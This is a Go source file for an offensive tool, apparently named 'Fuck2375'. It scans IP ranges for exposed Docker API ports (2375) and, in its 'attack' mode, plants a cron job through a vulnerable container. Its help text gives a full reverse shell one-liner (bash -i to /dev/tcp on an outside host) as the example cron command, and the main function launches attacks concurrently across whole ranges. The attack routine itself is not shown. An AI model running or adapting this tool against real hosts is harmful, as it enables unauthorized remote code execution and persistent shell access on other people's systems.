package main

import (
	"flag"
	"fmt"
	"sync"
)

var wp sync.WaitGroup

var IP[] string

func main(){

	VulnContainerName := ""
	helpFlag := flag.Bool("h", false, "")
	IPTarget := flag.String("target","","")
	CronCommand :=flag.String("croncmd","","")
	ContainerName :=flag.String("container","","")
	Action := flag.String("action","","")

	// 解析命令行参数
	flag.Parse()

	IPContent := *IPTarget
	CronCommandContent := *CronCommand
	HelpContent := *helpFlag
	ContainerNameContent := *ContainerName
	ActionContent := *Action

	if (IPContent==""||ActionContent=="")||HelpContent{
		fmt.Println("-target   IP range:192.168.1.1-255,192.168.1/28,192.168.1.1\n" +
			"-croncmd   Command to execute planned tasks\n" +
			"-container   Optional value, name of the vulnerability container created, default value is test_HgYCC3HqP1111\n" +
			"-action scan    just do port scanning\n" +
			"-action attack   scan and attack")
		fmt.Println("example:")
		fmt.Println("Fuck2375 -action attack -target 192.168.135.66 -croncmd \"bash -c 'bash -i >& /dev/tcp/192.168.135.4/4447 0>&1'\" -container test111")
		fmt.Println("Fuck2375 -action scan -target 192.168.135.1-255")
		return
	}

	//创建的漏洞容器名称默认为test_hgYCC3HqP1111
	if ContainerNameContent !=""{
		VulnContainerName = ContainerNameContent
	}else {
		VulnContainerName = "test_hgYCC3HqP1111"
	}

	//解析用户输入的IP范围
	getIP(IPContent)

	if ActionContent == "attack" && CronCommandContent!=""{
		for _,ip := range IP{
			wp.Add(1)
			go func(ip string) {
				defer wp.Done()
				AttackToSetCron(ip,CronCommandContent,VulnContainerName)
			}(ip)
		}
	}else if ActionContent=="scan"{
		for _,ip := range IP{
			wp.Add(1)
			go func(ip string) {
				defer wp.Done()
				if Port2375(ip){
					fmt.Println(ip + "'s 2375 port is Open!!!!!!!!!!!!!!!!!!!!")
				} else {
					fmt.Println(ip + "'s 2375 port is closed!")
				}
			}(ip)
		}
	}
	wp.Wait()

}